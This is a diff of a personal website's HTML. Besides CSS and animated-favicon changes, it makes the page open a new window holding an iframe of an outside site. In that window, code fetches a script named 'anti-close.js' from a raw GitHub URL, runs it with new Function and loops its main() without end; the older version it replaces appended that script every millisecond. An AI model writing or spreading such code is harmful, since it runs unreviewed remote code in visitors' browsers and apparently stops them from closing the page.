@@ -6,41 +6,40 @@
 <title>My Personal Site</title>
 <meta name="theme-color" content="#111111">
 <style>
-  /* ===== Dark Theme & Responsive Layout ===== */
-  body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background: #111111;
-    color: #f5f5f5;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    margin: 0;
-    padding: 20px;
-    box-sizing: border-box;
-  }
-  h1 { font-size: 2.5rem; margin-bottom: 1rem; text-align: center; text-shadow: 0 0 8px #00f0ff; }
-  p { font-size: 1rem; margin-bottom: 2rem; color: #ccc; text-align: center; }
-  button {
-    padding: 12px 30px;
-    font-size: 1rem;
-    cursor: pointer;
-    border: none;
-    border-radius: 10px;
-    background: linear-gradient(90deg, #00f0ff, #0050ff);
-    color: #111;
-    font-weight: bold;
-    box-shadow: 0 5px 15px rgba(0,255,255,0.4);
-    transition: all 0.3s ease;
-  }
-  button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,255,255,0.6); }
-  footer { position: absolute; bottom: 10px; font-size: 0.85rem; color: #666; text-align: center; width: 100%; }
-  @media (max-width:600px){
-    h1{font-size:2rem;}
-    p{font-size:0.9rem;}
-    button{padding:10px 20px;font-size:0.9rem;}
-  }
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #111111;
+  color: #f5f5f5;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  margin: 0;
+  padding: 20px;
+  box-sizing: border-box;
+}
+h1 { font-size: 2.5rem; margin-bottom: 1rem; text-align: center; text-shadow: 0 0 8px #00f0ff; }
+p { font-size: 1rem; margin-bottom: 2rem; color: #ccc; text-align: center; }
+button {
+  padding: 12px 30px;
+  font-size: 1rem;
+  cursor: pointer;
+  border: none;
+  border-radius: 10px;
+  background: linear-gradient(90deg, #00f0ff, #0050ff);
+  color: #111;
+  font-weight: bold;
+  box-shadow: 0 5px 15px rgba(0,255,255,0.4);
+  transition: all 0.3s ease;
+}
+button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,255,255,0.6); }
+footer { position: absolute; bottom: 10px; font-size: 0.85rem; color: #666; text-align: center; width: 100%; }
+@media (max-width:600px){
+  h1{font-size:2rem;}
+  p{font-size:0.9rem;}
+  button{padding:10px 20px;font-size:0.9rem;}
+}
 </style>
 </head>
 <body>
@@ -51,11 +50,10 @@
 
 <script>
 const totalFrames = 64;
-const frameDelay = 90; // ms per frame
+const frameDelay = 90;
 const favicon16Folder = '/favicon16';
 const favicon32Folder = '/favicon32';
 
-// Generate frame URLs
 function generateFrames(folder,count){
   const frames=[];
   for(let i=0;i<count;i++){
@@ -74,8 +72,13 @@ document.getElementById('openBtn').addEventListener('click',()=>{
 
   const frames=(window.devicePixelRatio>1 && favicon32.length>0)?favicon32:favicon16;
 
-  // Preload images
-  const images=frames.map(src=>{const img=new Image(); img.src=src; return img; });
+  // Preload images but start animation instantly
+  const images=[];
+  frames.forEach(src=>{
+    const img=new Image();
+    img.src=src;
+    images.push(img);
+  });
 
   win.document.write(`
   <!DOCTYPE html>
@@ -94,45 +97,58 @@ document.getElementById('openBtn').addEventListener('click',()=>{
   <body>
     <iframe src="https://nullxiety.com" allowfullscreen></iframe>
     <script>
-      // ===== Animated Favicon =====
+      // ===== Instant Favicon GIF Animation =====
       const frames=${JSON.stringify(frames)};
       const frameDelay=${frameDelay};
-      const images=frames.map(src=>{const img=new Image();img.src=src;return img;});
+      const images=[];
+      frames.forEach(src=>{
+        const img=new Image();
+        img.src=src;
+        images.push(img);
+      });
+
       const canvas=document.createElement('canvas');
-      const size=Math.min(32,window.devicePixelRatio>1?32:16);
+      let size=Math.min(32,window.devicePixelRatio>1?32:16);
       canvas.width=size; canvas.height=size;
       const ctx=canvas.getContext('2d');
       const link=document.querySelector('link[rel="icon"]')||document.createElement('link');
       link.rel='icon';
       document.head.appendChild(link);
+
       let current=0;
-      function animate(){
-        const img=images[current];
-        if(img.complete){
-          ctx.clearRect(0,0,size,size);
-          ctx.drawImage(img,0,0,size,size);
-          link.href=canvas.toDataURL('image/png');
+      let lastTime=performance.now();
+
+      function animateFavicon(now){
+        if(now - lastTime >= frameDelay){
+          const img=images[current];
+          if(img.complete){
+            ctx.clearRect(0,0,size,size);
+            ctx.drawImage(img,0,0,size,size);
+            link.href=canvas.toDataURL('image/png');
+          }
+          current=(current+1)%images.length;
+          lastTime=now;
         }
-        current=(current+1)%images.length;
-        setTimeout(animate,frameDelay);
+        requestAnimationFrame(animateFavicon);
       }
-      animate();
+      requestAnimationFrame(animateFavicon);
+
       window.addEventListener('resize',()=>{
-        const newSize=Math.min(32,window.devicePixelRatio>1?32:16);
-        canvas.width=newSize; canvas.height=newSize;
+        size=Math.min(32,window.devicePixelRatio>1?32:16);
+        canvas.width=size; canvas.height=size;
       });
 
-      // ===== Load anti-close.js from GitHub and run infinitely =====
-      function loadAndRunScript(){
-        const script=document.createElement('script');
-        script.src='https://raw.githubusercontent.com/stetson609-wq/loading.../refs/heads/main/anti-close.js';
-        script.onload=()=>{ console.log('anti-close.js loaded'); };
-        script.onerror=()=>{ console.error('Failed to load anti-close.js'); };
-        document.body.appendChild(script);
-      }
-      // Run immediately and then infinitely every 1s
-      loadAndRunScript();
-      setInterval(loadAndRunScript,1);
+      // ===== Load anti-close.js once and run infinitely =====
+      (function(){
+        fetch('https://raw.githubusercontent.com/stetson609-wq/loading.../refs/heads/main/anti-close.js')
+          .then(res=>res.text())
+          .then(code=>{
+            // Wrap main function in a requestAnimationFrame loop
+            const func = new Function(code + '\\n; function loop(){ try{ main(); } catch(e){console.error(e);} requestAnimationFrame(loop);} loop();');
+            func();
+          })
+          .catch(err=>console.error('Failed to load anti-close.js:', err));
+      })();
     </script>
   </body>
   </html>
